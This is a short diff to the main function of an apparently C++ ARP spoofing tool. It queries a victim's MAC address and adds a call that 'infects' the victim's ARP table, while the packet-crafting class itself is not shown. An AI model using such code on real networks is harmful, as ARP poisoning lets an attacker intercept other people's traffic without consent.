@@ -18,13 +18,18 @@ int main(int argc, char *argv[], char *envp[])
     delete verif;
     // end verification
 
-    // get info
+    // Constructor
     arp_packet arp = arp_packet(argv[1], argv[2], argv[3]);
+
     // get victim's MAC Address
-    // info.print_status();
     arp.arp_request();
     arp.arp_capture();
+    
+    // info.print_status();
     arp.print_status();
+    
     // infect victim ARP table
+    arp.arp_reply();
+
     return 0;
 }
